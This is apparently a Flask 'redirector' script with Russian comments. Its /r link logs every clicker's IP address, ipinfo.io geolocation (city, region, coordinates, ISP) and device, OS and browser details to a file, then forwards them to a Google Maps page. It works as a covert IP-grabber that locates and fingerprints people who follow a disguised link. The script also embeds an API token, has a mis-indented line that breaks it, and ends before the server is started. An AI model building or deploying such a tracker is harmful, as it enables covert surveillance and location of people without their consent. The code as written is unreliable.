from flask import Flask, request, redirect
from datetime import datetime
from user_agents import parse as ua_parse
import requests
import json
import os

app = Flask(__name__)

IPINFO_TOKEN = "9bc48d8ba04675"
LOG_FILE = "flask_geo_redirect.jsonl"  # Упростил путь для совместимости

def geolocate(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}", timeout=2)
        if r.status_code == 200:
            data = r.json()
            return {
                "city": data.get("city"),
                "region": data.get("region"),
                "country": data.get("country"),
                "loc": data.get("loc"),
                "org": data.get("org")
            }
    except Exception as e:
        print(f"[geo error] {e}")
    return {}

@app.route("/")
def index():
    return "🟢 Flask redirector is running!"

@app.route("/r")
def redirector():
    xff = request.headers.get("X-Forwarded-For", "")
ip = xff.split(",")[0].strip() if xff else request.remote_addr

    ua = ua_parse(request.headers.get("User-Agent", ""))
    geo = geolocate(ip)

    log_entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "ip": ip,
        "geo": geo,
        "user_agent": request.headers.get("User-Agent", ""),
        "device": {
            "family": ua.device.family,
            "brand": ua.device.brand,
            "model": ua.device.model
        },
        "os": ua.os.family + " " + ua.os.version_string,
        "browser": ua.browser.family + " " + ua.browser.version_string
    }

    log_line = json.dumps(log_entry, ensure_ascii=False)
    # Запись в файл
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_line + "\n")

    # Лог в консоль для отладки
    print("[LOG ENTRY]", log_line)

    # Редирект (можешь подставить свою ссылку)
    return redirect("https://www.google.com/maps/place/%D0%92%D0%B8%D0%BB%D0%BB%D0%B0...")  


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    
